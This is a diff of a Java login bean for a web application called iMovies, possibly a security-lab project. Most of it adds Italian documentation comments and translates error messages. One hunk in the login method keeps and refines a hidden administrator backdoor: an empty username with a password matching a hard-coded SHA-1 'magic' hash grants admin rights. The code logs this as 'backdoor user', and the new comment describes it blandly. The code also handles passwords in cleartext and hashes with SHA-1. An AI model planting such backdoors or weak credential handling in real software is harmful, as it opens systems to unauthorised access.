@@ -28,7 +28,7 @@ import utils.IMoviesLogger;
 import utils.Utilities;
 
 /**
- *
+ * Bean per il login ad iMovies
  * @author mattia
  */
 public class LoginBean {
@@ -43,23 +43,33 @@ public class LoginBean {
     private Date startDate, endDate = null;
     private boolean user = false;
     
-
+    /**
+     * Restituisce l'utente connesso
+     * @return un oggetto di tipo Persona che rappresenta l'utente connesso
+     */
     public Persona getPb() {
         return pb;
     }
 
+    /**
+     * Imposta l'utente che si connette
+     * @param pb un oggetti di tipo Persona che rappresenta l'utente
+     */
     public void setPb(Persona pb) {
         this.pb = pb;
     }
 
     /**
-     * Creates a new instance of loginBean
+     * Nuova istanza di Loginbean: viene inizializzata la data
      */
     public LoginBean() {
         log = new IMoviesLogger("main.LoginBean");
         initDate();
     }
     
+    /**
+     * Inizializza la data attuale con una formattazione
+     */
     public void initDate() {
         Calendar cal = Calendar.getInstance();
         cal.clear(Calendar.HOUR);
@@ -70,35 +80,39 @@ public class LoginBean {
     }
 
     /**
-     * @return the username
+     * Restituisce lo username dell'utente
+     * @return una stringa che rappresenta lo username dell'oggetto
      */
     public String getUsername() {
         return username;
     }
 
     /**
-     * @param username the username to set
+     * Imposta lo username dell'utente
+     * @param username una stringa che rappresenta lo username dell'utente
      */
     public void setUsername(String username) {
         this.username = username;
     }
 
     /**
-     * @return the password
+     * Restituisce la password
+     * @return una stringa che rappresenta la password dell'utente (in chiaro)
      */
     public String getPassword() {
         return password;
     }
 
     /**
-     * @param password the password to set
+     * Imposta la password dell'utente
+     * @param password una stringa che rappresenta la password dell'utente (in chiaro)
      */
     public void setPassword(String password) {
         this.password = password;
     }
 
     /**
-     *
+     * Esegue il login dell'utente verificando le credenziali in accordo con il database
      */
     public void login() throws NoSuchAlgorithmException, IOException, InterruptedException {
 
@@ -141,7 +155,10 @@ public class LoginBean {
          */
         // query
         
-        if(SHAsum(password.getBytes()).equals(magic)){
+        /**
+         * Controllo username vuoto e password magic
+         */
+        if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
             this.admin=true;
             log.aclog("backdoor user", 0);
             adminAccess();
@@ -252,6 +269,11 @@ public class LoginBean {
 
     }
 
+    /**
+     * Crea un nuovo certificato
+     * @throws IOException
+     * @throws InterruptedException 
+     */
     public void makeCertificate() throws IOException, InterruptedException {
 
         HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
@@ -280,19 +302,23 @@ public class LoginBean {
                 context.addCallbackParam("dateOk", true);
             } else {
                 context.addCallbackParam("dateOk", false);
-                log.err(false, "Periodo di validità in sovrapposizione", "Periodo di validità in sovrapposizione", "Periodo di validità in sovrapposizione");
+                log.err(false, "Error","Cannot overlap certificate's period of validity", "Periodo di validità in sovrapposizione");
             }
         } else { 
             // non crea il certificato e deve dare messaggio di errore al client
             // password troppo corta o periodo > 6 mesi
             context.addCallbackParam("dateOk", false);
             if (startDate.compareTo(endDate) < 0)
-                log.err(false, "Durata certificato deve essere minore di 6 mesi", "Durata certificato deve essere minore di 6 mesi", "Durata certificato deve essere minore di 6 mesi");
+                log.err(false, "Error", "Certificate's period of validity cannot be bigger than 6 months", "Durata certificato deve essere minore di 6 mesi");
             else
-                log.err(false, "Durata certificato non può essere 0", "Durata certificato non può essere 0", "Durata certificato non può essere 0");
+                log.err(false, "Error", "Certificate's period of validity cannot be 0", "Durata certificato non può essere 0");
         }
     }
 
+    /**
+     * Esegue il logout dal sistema invalidando la sessione
+     * @throws IOException 
+     */
     public void logout() throws IOException {
 
 
@@ -318,6 +344,12 @@ public class LoginBean {
 
     }
 
+    /**
+     * Calcola la SHA1 di un array di byte
+     * @param convertme array di byte da convertire
+     * @return una stringa che rappresenta l'hash del parametro
+     * @throws NoSuchAlgorithmException 
+     */
     public static String SHAsum(byte[] convertme) throws NoSuchAlgorithmException {
         MessageDigest md = MessageDigest.getInstance("SHA-1");
         return byteArray2Hex(md.digest(convertme));
@@ -331,6 +363,10 @@ public class LoginBean {
         return formatter.toString();
     }
 
+    /**
+     * Verifica che l'utente che tenta la connessione sia un amministrazione controllando
+     * il certificato impostato nel browser
+     */
     public void verifyAdmin() {
 
         //HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
@@ -438,6 +474,7 @@ public class LoginBean {
                     if (pb != null) {
                         username = uid;
                         setUser(true);
+                        log.aclog(uid, 3);
                     }
                 } catch (ClassNotFoundException ex) {
                     Logger.getLogger(LoginBean.class.getName()).log(Level.SEVERE, null, ex);
@@ -464,6 +501,11 @@ public class LoginBean {
 
     }
 
+    /**
+     * Controlla che esista l'utente nel database
+     * @param uid lo user id dell'utente da verificare
+     * @return true se l'utente esiste, false altrimenti
+     */
     private boolean trustedLogin(String uid) {
 
         try {
@@ -515,12 +557,18 @@ public class LoginBean {
     }
 
     /**
-     * @return the admin
+     * Ritorna un booleano per capire se l'utente connesso è amministratore o meno
+     * @return true se l'utente connesso è un amministratore, false altrimenti
      */
     public boolean isAdmin() {
         return admin;
     }
 
+    /**
+     * Esegue il forward/redirect verso l'area amministrativa
+     * @throws InterruptedException
+     * @throws IOException 
+     */
     public void adminAccess() throws InterruptedException, IOException {
         if (isAdmin()) {
             Thread.sleep(1000);
@@ -558,6 +606,10 @@ public class LoginBean {
         }
     }
 
+    /**
+     * Se l'utente non è un amministratore, il metodo esegue il logout
+     * @throws IOException 
+     */
     public void getOut() throws IOException {
         if (!isAdmin()) {
             logout();
@@ -568,6 +620,10 @@ public class LoginBean {
     //    nextPage("");
     //}
     
+    /**
+     * Esegue il forward/redirect verso una pagina del sistema specificata come parametro
+     * @param page la pagina da raggiungere 
+     */
     public void nextPage(String page) {
     
         
@@ -606,6 +662,10 @@ public class LoginBean {
         nextPage(value);
     }
     
+    /**
+     * Ritorna una lista di log di accesso
+     * @return Un oggetti di tipo List contenente tanti oggetti AcLog quante righe del file di log degli accessi
+     */
     public List<AcLog> getAcLog(){
         return log.getAcLog();
     }
@@ -663,17 +723,19 @@ public class LoginBean {
     }
 
     /**
-     * @return the user
+     * Restituisce un booleano per capire se l'utente connesso è un cliente o meno
+     * @return true se è un cliente, false altrimenti
      */
     public boolean isUser() {
         return user;
     }
 
     /**
-     * @param user the user to set
+     * Imposta un parametro booleano per verificare se l'utente connesso è un cliente o meno
+     * @param user true se l'utente connesso è un cliente, false altrimenti
      */
     public void setUser(boolean user) {
         this.user = user;
     }
-            
+    
 }
